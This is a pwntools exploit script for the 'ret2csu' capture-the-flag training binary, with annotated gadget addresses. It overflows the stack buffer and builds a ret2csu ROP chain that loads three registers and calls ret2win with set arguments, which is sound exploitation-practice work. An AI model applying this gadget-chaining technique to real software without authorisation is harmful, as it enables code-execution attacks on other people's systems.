from pwn import *

elf = ELF("../ret2csu/ret2csu")

# p = process("../ret2csu/ret2csu")
context.terminal = ["tmux", "splitw"]
p = gdb.debug('../ret2csu/ret2csu',
              '''b pwnme
              continue''')

"""
.text:000000000040069A pop     rbx
.text:000000000040069B pop     rbp
.text:000000000040069C pop     r12
.text:000000000040069E pop     r13
.text:00000000004006A0 pop     r14
.text:00000000004006A2 pop     r15
.text:00000000004006A4 retn

.text:0000000000400680 mov     rdx, r15
.text:0000000000400683 mov     rsi, r14
.text:0000000000400686 mov     edi, r13d
.text:0000000000400689 call    ds:(__frame_dummy_init_array_entry - 600DF0h)[r12+rbx*8]

.text:0x000000004006A3 pop rdi; ret;

arg1 ->  arg2 ->  arg3
rdi  ->  rsi  ->  rdx

call ret2win -> r12 = ret2win && rbx = 0
"""

ret2win = elf.symbols["ret2win"]

arg1 = 0xdeadbeefdeadbeef
arg2 = 0xcafebabecafebabe
arg3 = 0xd00df00dd00df00d

junk = b'A' * 0x20 + b'A' * 8
payload  = junk
payload += p64(0x40069a)
payload += p64(0)
payload += p64(0) 
payload += p64(0x600e38)    
payload += p64(0)           
payload += p64(arg2)
payload += p64(arg3)
payload += p64(0x400680)
payload += p64(0)
payload += p64(0) 
payload += p64(0) 
payload += p64(0) 
payload += p64(0) 
payload += p64(0x4006A3)
payload += p64(arg1)
payload += p64(ret2win)

p.recvuntil(b"> ")
p.sendline(payload)

p.interactive()